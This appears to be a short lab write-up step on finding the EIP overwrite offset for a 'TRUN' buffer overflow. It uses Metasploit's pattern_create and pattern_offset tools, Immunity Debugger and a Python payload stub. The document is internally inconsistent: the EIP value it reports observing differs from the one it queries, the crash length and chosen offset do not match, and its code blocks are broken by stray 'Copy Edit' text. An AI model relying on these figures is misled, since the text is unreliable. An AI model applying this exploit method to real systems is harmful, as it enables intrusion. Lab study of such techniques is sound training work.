# 3. Finding the Offset

**Goal:** Identify the exact number of bytes needed to reach and overwrite EIP

---

## 🔧 Steps Taken:

1. Crash occurred at ~22150 bytes (from fuzzing)
2. Generated pattern:
```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 22500
Sent pattern via this Python script:

python
Copy
Edit
payload = "TRUN /.:/" + "<pattern here>"
Observed EIP value in Immunity:
EIP =  386F4337

Found exact offset:

bash
Copy
Edit
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39654138 -l 22500
Result:
Exact match at offset 2003
Exact match at offset 22283

We will use 2003
